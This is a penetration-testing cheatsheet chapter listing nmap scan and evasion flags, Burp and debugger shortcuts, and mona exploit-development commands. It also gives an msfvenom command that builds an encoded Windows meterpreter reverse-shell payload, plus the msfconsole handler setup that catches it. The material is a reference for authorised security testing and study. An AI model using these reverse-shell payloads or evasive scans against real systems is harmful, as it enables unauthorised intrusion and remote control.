# Chapter 1 - Cheatsheets

> _If you wanna know how not secure you are, just take a look around. Nothing's secure. Nothing's safe. I don't hate technology, I don't hate hackers, because that's just what comes with it, without those hackers we wouldn't solve the problems we need to solve, especially security._
>
> _**— **_**Fred Durst**

It can take quite some time to remember all the nuances of commands and arguments for the various tools we must use. It's almost like learning a second language this is intended as a reference of what to use and how to use it

## NMAP

##### Network Scan

> ###### Arguments

```
-sn - ping scan (disable port scan, assumes all hosts up)
-sP - ping scan (skip host discovery, only shows hosts that respond) 
-sL - scan list
```

> ###### Examples

```
Kali> nmap -sn 192.168.1.0/24
Kali> nmap -sP 192.168.1.0/24
Kali> for ip in $(cat targets.txt);do nmap -A -T4 -oN scans/nmap.$ip.txt $ip;done
```

##### Host Scan

> ###### Arguments

```
-p {1-65535} - ports
-6 - ipv6
-O - OS Detection
--osscan-limit - light os scan
--osscan-guess - aggressive os scan
-sV - version detection
--version-intensity {0-9} - light to aggressive
-sT - connect scan
-sU - UDP scan
-sS - stealth syn scan
-sN - tcp null scan
-A - OS detection + nmap scripts + traceroute + version
--script {script.nse} - load specific nmap script
--script-args={args} - pass arguments to script
```

> ###### Examples

```
Kali> nmap -p 1-65535 -sV -sS -T4 $TARGET
Kali> nmap -v -sS -A -T4 $TARGET
Kali> nmap -v -sV -O -sS -T4 $TARGET
```

##### Timing

> ###### Arguments

```
-n - never resolve dns
-R - always resolve dns
-T{0-5} - scan timing slow to fast
-F - fast scan
-r - scan ports consecutively
--version-intensity {0-9} - light to aggressive
--host-timeout {number}
--min-rate {number} --max-rate {number}
--max_retries {number}
```

##### Evasion

> ###### Arguments

```
-f [--mtu {number}] - fragment packets optionally with mtu
-D {decoy1,decoy2} - cloak with decoys
-S {ip} - spoof ip address
-g {port} - use given port number for scan
--proxies {url,url2} - use proxy through http/socks4
--data-length {number} - append random data to packets
--ip-options {options} - send packets with ip options
--ttl {number} - set ip ttl
--spoof-mac {mac} - spoof mac for scan
--bad-sum - send packets with bogus checksums
```

##### Output

> ###### Arguments

```
-v - verbose output
-oX - output xml
-oG - output greppable
--open - only show potentially open ports
--packet-trace - show all packets sent/recv
--append-output - noclobber
```

## MSFVenom

> ##### Arguments

```
-p - payload
--payload-options
    Display available payloads
LHOST=ADDRESS - Argument for IP Address
LPORT=PORT - Argument for port
-n [number] - NOPS
--platform {Windows|Linux} - Platform to build shellcode for
-a {x86|x64} - Architecture
-e {x86/shikata_ga_nai} - encoder
-b '{badchars}' - remove badchars from payload
-v [string] - name your variable
-f {python} - format for payload
--smallest - attempt to make payload as tiny as possible
```

> ##### Examples

```
Kali> msfvenom -p windows/meterpreter/reverse_tcp
                                lhost=192.168.1.232
                                lport=4444
                                --platform Windows
                                -a x86
                                -e x86/shikita_ga_nai
                                -b '\x00\x20\x25\x2b\x2f\x5c'
                                -v payload
                                -f python
                                --smallest
```

## BurpSuite

> ##### Setup

```
add to scope
only show scoped items
```

> ##### Intercept Traffic

```
Chain Burp Proxy such as:
127.0.0.1:80 -> $TARGET:80
```

> ##### Shortcuts

```
Send to repeater: Ctrl+R
```

## MSFConsole

> ##### Reverse TCP

```
msfconsole> use multi/handler
msfconsole> set payload windows/meterpreter/reverse_tcp
msfconsole> set lhost 10.10.10.1
msfconsole> set lport 4444
msfconsole> set exitonsession false
msfconsole> set enablestageencoding true
```

> ##### Jobs

```
msfconsole> jobs -K
msfconsole> jobs -L
```

## GDB

> ##### Commands

```
disas - disassemble
b - breakpoint
c - continue
r - run
p - TODO
st - step
x - examine
```

> ##### Examples

```
gdb> disas main
gdb> b 0xd34dc0d3
gdb> x/200x $esp
```

## WinDBG

> ##### Commands

```
g - pass exception
gN - step
bp [address] - breakpoint
bl - list breakpoints
!exchain - view exception chain
.load pykd.pyd - load python
!py mona [command] [args] - exceute mona stuff
a -> [jmp address]
u [address] - inspect
u - view stack
t - step
```

> ##### Examples

```
!py mona findmsp
!py mona seh
```

> ##### Shortcuts

```
Open Executable: CTRL+E
Attach to process: F6
Memory: Alt+5
Close Window: Ctrl+F4
Restart: Ctrl+Shift+F5
Break: Ctrl+Break
```

## ImmunityDebugger

> ##### Shortcuts

```
Breakpoint: F2
Step: F7
Exec till Return: Ctrl+F9
Run: F9
Pause: F12
```

## Mona

> ##### Arguments

```
pc [size] - generate cyclic pattern
po [address] - find offset
findmsp - find register overwritten with pattern
bytearray -b [badchars] - generate bytes from 0x00 to 0xff excluding badchars
jmp -r [register] - find a jump point
-n - skip modules that start with 0x00
-o - skip os modules
-m - module
-cm - module property
-cpd - filter bad chars
```

> ##### Examples

```
!mona config -set workingfolder path
!mona pc 2400
!mona po d34db33f
!mona findmsp
!mona find -s "\xff\xe4" -m comctl32.dll
!mona jmp -r esp
!mona seh -cm aslr=false
!mona seh -cpb "\x00\x0a\x0d"
```



